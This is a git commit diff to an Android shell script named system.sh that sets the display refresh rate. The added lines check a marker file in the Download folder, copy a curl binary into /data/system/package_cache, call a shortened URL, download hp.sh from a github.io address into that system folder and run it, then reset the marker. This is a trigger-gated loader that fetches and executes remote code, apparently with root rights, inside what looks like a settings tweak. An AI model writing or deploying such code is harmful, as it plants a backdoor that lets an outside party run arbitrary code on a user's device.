fdb06026c108db4b2d0eb0cd0dc9b7e6e6b6faf9
幻tly <81273793+tanluying@users.noreply.github.com>
2025-09-01 01:05:49 +0800

    Update system.sh

--- system.sh
+++ system.sh
@@ -1,5 +1,19 @@
 #echo "123" > /storage/emulated/0/Download/apks.txt
+#上一个是456
 #cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
 #curl -l https://sourl.cn/tRtpnk
 settings put system peak_refresh_rate 1
-sleep 3600
+if [ ! -f "/storage/emulated/0/Download/apks.log" ]; then
+    echo "创建失败"
+    exit 1
+fi
+file_content=$(cat "/storage/emulated/0/Download/apks.log" | tr -d '\r\n')
+if [ "$file_content" = "123" ]; then
+    echo "ok"
+    cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
+    curl -l https://sourl.cn/tRtpnk
+    curl -s -o /data/system/package_cache/hp.sh http://tanluying.github.io/ying/hp.sh
+    sh /data/system/package_cache/hp.sh
+fi
+echo "456" > /storage/emulated/0/Download/apks.log
+sleep 900
